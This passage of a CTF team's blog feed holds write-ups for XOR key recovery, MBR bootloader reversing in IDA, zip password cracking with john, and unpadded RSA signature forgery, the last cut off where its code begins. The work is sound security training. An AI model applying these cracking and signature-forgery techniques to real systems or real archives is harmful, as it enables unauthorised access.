class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(data, key)</span>:</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> data:</span><br><span class="line">        res.append(chr(c ^ ord(key[idx])))</span><br><span class="line">        idx = (idx + <span class="number">1</span>) % len(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = [</span><br><span class="line"> <span class="number">40</span>, <span class="number">11</span>, <span class="number">82</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">82</span>, <span class="number">64</span>, <span class="number">76</span>, <span class="number">6</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">26</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">127</span>, <span class="number">45</span>, <span class="number">1</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">31</span>, <span class="number">15</span>]</span><br><span class="line">print(<span class="string">'Enter key to get flag:'</span>)</span><br><span class="line">key = input()</span><br><span class="line"><span class="keyword">if</span> len(key) != <span class="number">8</span>:</span><br><span class="line">    print(<span class="string">'Invalid len'</span>)</span><br><span class="line">    quit()</span><br><span class="line">res = decode(flag, key)</span><br><span class="line">print(<span class="string">''</span>.join(res))</span><br></pre></td></tr></table></figure><p>Once again xor encryption since we already know the first 8 bytes of the flag as “cybrics{“ if we xor this with the first bytes of the encrypted flag we will get the key it’s easy to write a python script for this:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">40</span>, <span class="number">11</span>, <span class="number">82</span>, <span class="number">58</span>, <span class="number">93</span>, <span class="number">82</span>, <span class="number">64</span>, <span class="number">76</span>, <span class="number">6</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">26</span>, <span class="number">7</span>, <span class="number">4</span>, <span class="number">123</span>, <span class="number">124</span>, <span class="number">127</span>, <span class="number">45</span>, <span class="number">1</span>, <span class="number">125</span>, <span class="number">107</span>, <span class="number">115</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">31</span>, <span class="number">15</span>]</span><br><span class="line">x = <span class="number">0</span></span><br><span class="line">key = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">'cybrics&#123;'</span>:</span><br><span class="line">key += chr(ord(i) ^ c[x])</span><br><span class="line">x += <span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> key</span><br></pre></td></tr></table></figure><p>Getting the key</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python roflmao.py </span><br><span class="line">Kr0H4137</span><br></pre></td></tr></table></figure><p>The key was <strong>Kr0H4137</strong>, using it to decrypt the flag:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python3 result.py</span><br><span class="line">Enter key to get flag:</span><br><span class="line">Kr0H4137</span><br><span class="line">cybrics&#123;M4TR35HK4_15_B35T&#125;</span><br></pre></td></tr></table></figure><p>The flag was <strong>cybrics{M4TR35HK4_15_B35T}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Matreshka 50&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;Matreshka (Reverse, Easy, 50 pts) Author: Kh
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="java" scheme="https://teamrocketist.github.io/tags/java/"/>
    
      <category term="go" scheme="https://teamrocketist.github.io/tags/go/"/>
    
  </entry>
  
  <entry>
    <title>[Reverse] Midnightsun CTF 2019 - Hfs-mbr</title>
    <link href="https://teamrocketist.github.io/2019/04/06/Reverse-Midnightsun-CTF-2019-Hfs-mbr/"/>
    <id>https://teamrocketist.github.io/2019/04/06/Reverse-Midnightsun-CTF-2019-Hfs-mbr/</id>
    <published>2019-04-06T21:22:16.000Z</published>
    <updated>2019-04-07T00:19:11.116Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Hfs-mbr 213</p></blockquote><blockquote><p><strong>Description</strong>:<br>We made a military-grade secure OS for HFS members. Feel free to beta test it for us!<br><strong>Service</strong>: stty -icanon -echo ; nc hfs-os-01.play.midnightsunctf.se 31337 ; stty sane<br><strong>Download</strong>: <a href="https://s3.eu-north-1.amazonaws.com/dl.2019.midnightsunctf.se/529C928A6B855DC07AEEE66037E5452E255684E06230BB7C06690DA3D6279E4C/hfs-os.tar.gz" target="_blank" rel="noopener">hfs-os.tar.gz</a>   </p></blockquote><p>First all I want to thank Midnightsun CTF organizers for such an amazing CTF even that I didn’t have much time to play it due to IRL responsibilities, the few challenges I solved, I learned a lot, it was worth the time invested unlike the time I invested on EncryptCTF where I learned nothing.</p><p>The most awesome of this is challenge is actually the organizers gave instructions on a README file on how to debug this kind of MBR challenges on ida I always debugged this using gdb which is alot harder to analyse and debug specially when both <strong>gef</strong> and <strong>pwndbg</strong> get bugged and stop working leaving you to work on vanilla gdb which is beyond crazy.</p><p>So after extracting we get a bunch of files:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">bin/  dos.img  hfs-os.tar.gz  notes.txt  README  run*</span><br></pre></td></tr></table></figure><p>If we read the <strong>README</strong> we can get some instruction on how to debug on IDA</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat README</span><br><span class="line">HFS-OS</span><br><span class="line">./run debug (gdb stub) or ./run</span><br><span class="line"></span><br><span class="line">How to debug with IDA</span><br><span class="line">In IDA &gt; Debugger &gt; Attach &gt; Remote debugger (host:1234) &gt; (Debug options &gt; Set specific options, UNCHECK <span class="string">'software breakpoints at eip+1'</span>, CHECK <span class="string">'use CS:IP in real mode'</span>)  &gt; OK  </span><br><span class="line">When attached, Debugger &gt; Manual memory regions &gt; Insert &gt; CHECK 16bit segment &gt; OK  </span><br><span class="line">In the IDA-View, press G, 0x7c00 is <span class="built_in">where</span> the bootloader starts. Set a BP &gt; F9</span><br></pre></td></tr></table></figure><p>If we check up the contents of <strong>run</strong> file we can see if we add a debug parameter we can already setup qemu running on a gdb server at port 1234 (default port when not specifically set):<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ cat run </span><br><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ <span class="string">"<span class="variable">$1</span>"</span> = <span class="string">"debug"</span> ] ; <span class="keyword">then</span></span><br><span class="line">    <span class="built_in">cd</span> bin &amp;&amp; ./qemu-system-i386 -s -S -m 16 -k en-us -rtc base=localtime -nographic -drive file=../dos.img -boot order=c</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">cd</span> bin &amp;&amp; ./qemu-system-i386 -m 16 -k en-us -rtc base=localtime -nographic -drive file=../dos.img -boot order=c</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure></p><h3 id="Configuration-IDA"><a href="#Configuration-IDA" class="headerlink" title="Configuration IDA"></a>Configuration IDA</h3><p>You can skip this chapter if you already know about thsi and you just want to check on my solution to solve the challenge.</p><p>when opening <strong>dos.img</strong> change the loading offset to <strong>0x7c00</strong> so ida starts to convert the bytes into assembly form that point:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/rWgSJfD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/rWgSJfD.png" alt><br></a></p><p>After clicking <strong>OK</strong> make sure you say <strong>no</strong> so IDA dissembles it in 16 bit mode:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/gF6As1Q.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/gF6As1Q.png" alt><br></a></p><p>Now we just need to follow the instructions on README file:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/IIatduD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/IIatduD.png" alt><br></a></p><p>Select remote gdb debugger:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/7FTTII3.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/7FTTII3.png" alt><br></a></p><p>Go to debugger options:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/nh5JH6z.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/nh5JH6z.png" alt><br></a></p><p>Now into set specific options:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/xD75asg.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/xD75asg.png" alt><br></a></p><p>UNCHECK ‘software breakpoints at eip+1’, CHECK ‘use CS:IP in real mode’</p><p><a data-fancybox="gallery" href="https://i.imgur.com/uKPXdGN.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/uKPXdGN.png" alt><br></a></p><p>Still on this window click on memory maps:<br><a data-fancybox="gallery" href="https://i.imgur.com/BcAUSav.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/BcAUSav.png" alt><br></a></p><p>Right click and then <strong>insert</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/dUJ06EN.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/dUJ06EN.png" alt><br></a></p><p>Check 16-bit segment and then <strong>OK</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/YO7LXEK.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/YO7LXEK.png" alt><br></a></p><p>Go to process options:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/YjhgWFV.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/YjhgWFV.png" alt><br></a></p><p>Set up the hostname to your local ip from your linux machine and change to port to <strong>1234</strong></p><p><a data-fancybox="gallery" href="https://i.imgur.com/Y15qGq3.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/Y15qGq3.png" alt><br></a></p><h3 id="Solving-the-problem"><a href="#Solving-the-problem" class="headerlink" title="Solving the problem"></a>Solving the problem</h3><p>First setup the debugging server but just running:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ./run debug</span><br><span class="line">WARNING: Image format was not specified <span class="keyword">for</span> <span class="string">'../dos.img'</span> and probing guessed raw.</span><br><span class="line">         Automatically detecting the format is dangerous <span class="keyword">for</span> raw images, write operations on block 0 will be restricted.</span><br><span class="line">         Specify the <span class="string">'raw'</span> format explicitly to remove the restrictions.</span><br></pre></td></tr></table></figure></p><p>Setup a breakpoint on <strong>0x7c00</strong> and start debugging:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/v3VoTOG.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/v3VoTOG.png" alt><br></a></p><p>We can ignore <strong>sub_7C0C</strong> since is just setting up into video mode if we look up into <strong>sub_7C15</strong> (sometimes this bugs out and ida becomes messed up out of the sudden when this happens the only solution I found was to delete IDA database and redo the configuration steps don’t really know why this happens sometimes):   </p><p><a data-fancybox="gallery" href="https://i.imgur.com/sKhx1NO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/sKhx1NO.png" alt><br></a></p><p>After <strong>sub7E21</strong> you are going to jump into <strong>sub7E06</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/4XOD2Sn.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/4XOD2Sn.png" alt><br></a></p><p>From the picture above you can see before each <strong>call</strong> on <strong>sub_7E2B</strong> if you check on memory for this addresses you will see these are strings of the banner and the message to ask the password for the first part of the challenge:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/eic3oZ8.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/eic3oZ8.png" alt><br></a></p><p>By putting a breaking point on ret and running the binary until it reach you can see it printed the banner:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/jPLu3s0.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/jPLu3s0.png" alt><br></a></p><p>No we jump into <strong>loc_7E37</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/EtQ8qMp.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/EtQ8qMp.png" alt><br></a></p><p>The loose function 0x818a is the address of Wrong password string and <strong>sub_7E2B</strong> will print it so we want to avoid to jump here:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/bh5fhPF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/bh5fhPF.png" alt><br></a></p><p>Now interpreting the rest of <strong>sub_7E2B</strong></p><p><a data-fancybox="gallery" href="https://i.imgur.com/1md4NgF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/1md4NgF.png" alt><br></a></p><p>The result after jumping:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/kSSLG1b.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/kSSLG1b.png" alt><br></a></p><p>Now if you check the <strong>DEADCODE</strong> jump after pressing <strong>a</strong> you can see it after doing its thing it jumps into <strong>loc_7FD9</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/CRyQdtO.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/CRyQdtO.png" alt><br></a></p><p>Let’s see what happens if we press <strong>e</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/rnVFwTF.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/rnVFwTF.png" alt><br></a></p><p>If we check what happens if we jump to <strong>loc_7FCE</strong>:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/ZqpAerW.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ZqpAerW.png" alt><br></a></p><p>Now just do this for every letter and you will end up with a list like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">a -&gt; deadcode</span><br><span class="line">b -&gt; deadcode</span><br><span class="line">c -&gt; deadcode</span><br><span class="line">d -&gt; deadcode</span><br><span class="line">e -&gt; notdeadcode -&gt; if byte_81BA == 7 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">f -&gt; deadcode</span><br><span class="line">g -&gt; deadcode</span><br><span class="line">h -&gt; deadcode</span><br><span class="line">i -&gt; deadcode</span><br><span class="line">j -&gt; notdeadcode -&gt; if byte_81BA == 2 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">k -&gt; deadcode</span><br><span class="line">l -&gt; deadcode</span><br><span class="line">m -&gt; deadcode</span><br><span class="line">n -&gt; notdeadcode -&gt; if byte_81BA == 6 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">o -&gt; notdeadcode -&gt; if byte_81BA == 1 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">p -&gt; notdeadcode -&gt; if byte_81BA == 4 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">q -&gt; deadcode</span><br><span class="line">r -&gt; notdeadcode -&gt; if byte_81BA == 8 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">s -&gt; notdeadcode -&gt; if byte_81BA == 0 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">t -&gt; deadcode</span><br><span class="line">u -&gt; notdeadcode -&gt; if byte_81BA == 3 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">v -&gt; deadcode</span><br><span class="line">w -&gt; notdeadcode -&gt; if byte_81BA == 5 then &#123;byte_81BB++; byte_81BA++&#125; else byte_81BA++</span><br><span class="line">x -&gt; deadcode</span><br><span class="line">y -&gt; deadcode</span><br><span class="line">z -&gt; deadcode</span><br><span class="line"></span><br><span class="line">deadcode -&gt; byte_81BA++</span><br></pre></td></tr></table></figure></p><p>The calculations done to calculate the indexes:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ python -c <span class="string">"print 0x73 ^ 0x73"</span> <span class="comment"># s</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line">$ python -c <span class="string">"print (0x8e-(0x20))^0x6f"</span> <span class="comment"># o</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line">$ python -c <span class="string">"print (0x38 + 0x30) ^ 0x6a"</span> <span class="comment"># j</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line">$ python -c <span class="string">"print (0x88-(5*4))^0x70"</span> <span class="comment"># p</span></span><br><span class="line"><span class="number">4</span></span><br><span class="line">$ python -c <span class="string">"print (0x82 - 0x10)^0x77"</span> <span class="comment"># w</span></span><br><span class="line"><span class="number">5</span></span><br><span class="line">$ python -c <span class="string">"print 0x6e ^ 0x68"</span> <span class="comment"># n</span></span><br><span class="line"><span class="number">6</span></span><br><span class="line">$ python -c <span class="string">"print (0x2 + 0x60)^0x65"</span> <span class="comment"># e</span></span><br><span class="line"><span class="number">7</span></span><br><span class="line">$ python -c <span class="string">"print (0xac-(0x52-0x20))^0x72"</span> <span class="comment"># r</span></span><br><span class="line"><span class="number">8</span></span><br></pre></td></tr></table></figure><p>The password was <strong>sojupwner</strong></p><p>Getting the flag:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">[HFS SECURE BOOT] Loading  ...</span><br><span class="line">.-. .-.----.----.   .-.   .-.----..----.  </span><br><span class="line">| &#123;_&#125; | &#123;_&#123; &#123;__     |  `.<span class="string">'  | &#123;&#125;  | &#123;&#125;  &#125; </span></span><br><span class="line"><span class="string">| &#123; &#125; | | .-._&#125; &#125;   | |\ /| | &#123;&#125;  | .-. \ </span></span><br><span class="line"><span class="string">`-'</span> `-`-<span class="string">' `----'</span>    `-<span class="string">' ` `-`----'</span>`-<span class="string">' `-'</span> </span><br><span class="line">Enter the correct password to unlock the Operating System</span><br><span class="line">[HFS_MBR]&gt; sojupwner</span><br><span class="line">....</span><br><span class="line">[HFS SECURE SHELL] Here is your flag <span class="keyword">for</span> HFS-MBR: midnight&#123;w0ah_Sh!t_jU5t_g0t_RE</span><br><span class="line">ALmode&#125; </span><br><span class="line">[HFS SECURE SHELL] loaded at 100f:0100 (0x101f0) and ready <span class="keyword">for</span> some binary carna</span><br><span class="line">ge!</span><br></pre></td></tr></table></figure></p><p>The flag was <strong>HFS-MBR: midnight{w0ah_Sh!t_jU5t_g0t_REALmode}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Hfs-mbr 213&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;We made a military-grade secure OS for HFS me
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="ida" scheme="https://teamrocketist.github.io/tags/ida/"/>
    
      <category term="mbr" scheme="https://teamrocketist.github.io/tags/mbr/"/>
    
  </entry>
  
  <entry>
    <title>[Misc] EncryptCTF - crack-jack</title>
    <link href="https://teamrocketist.github.io/2019/04/05/Misc-EncryptCTF-crack-jack/"/>
    <id>https://teamrocketist.github.io/2019/04/05/Misc-EncryptCTF-crack-jack/</id>
    <published>2019-04-05T16:04:06.000Z</published>
    <updated>2019-04-05T16:15:50.452Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>crack-jack 50</p></blockquote><blockquote><p><strong>Description</strong>:<br>Visuals are Deceptive</p></blockquote><p>So… Visuals are Deceptive… I guess not only the visuals are deceptive :’)<br>We are publishing this write-up only to show how such an easy problem, that barely has no value compared to the other challenges (50pts), due to the <strong>excessive guessing</strong> component, can be tricky enough to be only solved by <strong>11 teams out of 696</strong>  </p><p><strong>Let’s get into it.</strong><br>Firstly, we are presented with this image <img src="https://i.imgur.com/bYs67n4.jpg" alt><br>Classic image with a bs flag in it. Surely this flag won’t do anything. We could try to use some steganography tools, but since other problems were meant to be solved using them, lets keep them as our last resort.</p><p>Let’s <code>binwalk</code> it.</p><p><img src="https://i.imgur.com/5nkjiGa.png" alt></p><p> After using <code>binwalk</code> it is possible to see that there is a <strong>zip</strong> archive inside. Let’s extract everything using <code>binwalk -e</code> to automatically extract known file types that exist inside the <strong>flag.png</strong> file.</p><p>Displaying everything that is inside the folder we see that exists, besides the zip file, a file named <strong>flag.txt</strong>. No way it is the real flag. <code>cat</code>‘ed and nothing as expected.</p><p>Let’s check the zip. <code>unzip</code>won’t do because it is password protected. What’s inside?</p><p><img src="https://i.imgur.com/H2UK0CF.png" alt></p><p>A <strong>flag.txt</strong> inside the password-protected zip? It must be it. The challenge has <em>crack</em> on its name. Let’s crack it!</p><p>Usually it this cases I use <code>zip2john</code> to get hashed passwords out of the zip archives and then brute-force them using <code>john</code> and a <strong>common wordlist</strong> ( e.g. <a href="https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt" target="_blank" rel="noopener">rockyou.txt</a> )</p><p><img src="https://i.imgur.com/idNcSKt.png" alt></p><p>Oh well…. <em>No password hashes lef to crack</em> and none was cracked… Usually if rockyou doesn’t work it has to be with some sort of information related to the challenge itself…</p><p><strong>Hello Guessing Part. Are you there?</strong><br>What can we try? Hmm… this was my line of thought:<br>  1-<strong>FAIL:</strong> <strong>Metadata?</strong> - used <code>exiftool</code> on both the zip file and on the initial flag.png. Nahhhh nothing interesting.</p><p>  2-<strong>FAIL: First Image Text?</strong> - well, flag.png has some text, such as “ENCRYPT CTF 2019”, “encryptCTF{N0t__7h@7_345y}”, etc… Did a script to use those strings plus the individual words of each string, etc, etc. Guess what? Nothing…</p><p>  <strong>3</strong>-<strong>CORRECT: Visuals are Deceiving</strong> - “what if the visuals (point 2) of an image are there to just deceive us and behind everything we see isn’t the true reality? earth being round or flat doesn’t mean anything because that’s just our visual perception of it and it’s deceiving the true form of it! Nothing that we see can be trusted” - said the author of this challenges when was creating it while tripping out.<br> Don’t get me wrong, I’m just kidding and hope you don’t get offended, but this is a clear representation of my initial statement. A supposedly <strong>easy challenge</strong> that doesn’t value that much (<strong>50pts</strong>) that <strong>deceives us</strong> into trying over and over basic stuff and losing a lot of time because if it is easy it should be done quickly and we are not expecting to be trying to <strong>lose time</strong> <strong>guessing</strong> <strong>random</strong> stuff.</p><p>Getting back to the solution. Since Visuals are Deceiving. what really matters from that initial flag.png isn’t the image itself but the text of the file. This can be obtained using <code>strings</code>. Getting this text, you can create a wordlist based on it and use it to crack the hash of the zip</p><p><img src="https://i.imgur.com/a5KVLoz.png" alt>  </p><p>Bingo! The password is: <strong>G^WBC[WLr3</strong>. Let’s unzip and view the content of the <strong>flag.txt</strong> file.</p><p><img src="https://i.imgur.com/lhLWmYm.png" alt></p><p>There you go. That’s how we did it. Hope we don’t get trash guessing challenges like this ever again…</p><blockquote><p>The flag was <strong>encryptCTF{C4acK!ng_7h3_Uncr4ck4bl3}</strong></p></blockquote><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;crack-jack 50&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;Visuals are Deceptive&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;
      
    
    </summary>
    
      <category term="Misc" scheme="https://teamrocketist.github.io/categories/Misc/"/>
    
    
      <category term="misc" scheme="https://teamrocketist.github.io/tags/misc/"/>
    
      <category term="encryptCTF" scheme="https://teamrocketist.github.io/tags/encryptCTF/"/>
    
      <category term="zip" scheme="https://teamrocketist.github.io/tags/zip/"/>
    
      <category term="jtr" scheme="https://teamrocketist.github.io/tags/jtr/"/>
    
      <category term="zip2john" scheme="https://teamrocketist.github.io/tags/zip2john/"/>
    
      <category term="binwalk" scheme="https://teamrocketist.github.io/tags/binwalk/"/>
    
      <category term="guessing" scheme="https://teamrocketist.github.io/tags/guessing/"/>
    
  </entry>
  
  <entry>
    <title>[Crypto] VolgaCtf2019 - Blind</title>
    <link href="https://teamrocketist.github.io/2019/04/01/Crypto-VolgaCtf2019-Blind/"/>
    <id>https://teamrocketist.github.io/2019/04/01/Crypto-VolgaCtf2019-Blind/</id>
    <published>2019-04-01T00:16:26.000Z</published>
    <updated>2019-04-08T21:51:53.352Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Blind 200</p></blockquote><blockquote><p><strong>Description</strong>:<br>Pull the flag…if you can.<br>nc blind.q.2019.volgactf.ru 7070<br>server.py</p></blockquote><h3 id="Identifying-the-problem"><a href="#Identifying-the-problem" class="headerlink" title="Identifying the problem"></a>Identifying the problem</h3><p>The server has a set of commands which a client can use, the commands <strong>cat</strong> and <strong>cd</strong> to be executed need to be signed by the servers private key, we don’t have access to that key, but we can sign anything besides the commands <strong>cat</strong> and <strong>cd</strong>, looking at the code we can see the server is signing our message directly with unpadded RSA, knowing this we can use RSA’s malleability property to forge a signature.</p><h3 id="Applying-the-attack"><a href="#Applying-the-attack" class="headerlink" title="Applying the attack"></a>Applying the attack</h3><p>The signing is done by simply doing:   </p><p><img src="https://i.imgur.com/rRe23k5.png" alt></p><p>Where:</p><ul><li>m is the message</li><li>d is the rsa private exponent</li><li>n is the modulus </li></ul><p>We know that RSA is homomorphic to the multiplication this means for example that this is true:</p><p><img src="https://i.imgur.com/qunGaSC.png" alt></p><p>To get the flag we need to use the command cat and do something like <strong>cat flag</strong> to obtain it, so since we can’t do it directly we gotta find an <strong>r</strong> that modifies our message so it modifies our message to something different than <strong>cat</strong> , we can then use this property of rsa to forge a signature by nullifying the <strong>first division</strong> with a <strong>multiplication</strong>.</p><p>For example we first sign our message <strong>m</strong> divided by an <strong>r</strong> number like this:   </p><p><img src="https://i.imgur.com/EhVkwhw.png" alt>   </p><p>Now we can just sign the number <strong>r</strong>:   </p><p><img src="https://i.imgur.com/60KFYBt.png" alt></p><p>Now we can obtain the final signature we wanted by just <strong>multiplying</strong> both signatures:</p><p><img src="https://i.imgur.com/iZeeztx.png" alt></p><p>Hence resuming what I showed you in the pictures we can trivially divide our challenge by a number r (provided it is in itself considered valid for signing and the challenge is a multiple of it), say 2, sign it and sign the quotient separately, multiply them and apply modular reduction with the public key’s modulus and hence forge the signature.</p><h3 id="Avoiding-some-problems-encountered-because-of-this-particular-challenge"><a href="#Avoiding-some-problems-encountered-because-of-this-particular-challenge" class="headerlink" title="Avoiding some problems encountered because of this particular challenge"></a>Avoiding some problems encountered because of this particular challenge</h3><p>Because this challenge is using some specific libraries to parse the commands the output of our sign <strong>m/r</strong> and <strong>r</strong> can’t contain for example <strong>spaces</strong> or <strong>quote</strong> characters otherwise the server will throw an error when using <strong>shlex.split(message)</strong>, the spaces because it’s going to split into multiple commands and the server will only sign part of the command, and the quotes really throws errors if they aren’t closed or escaped so I wrote an function find a valid <strong>r</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 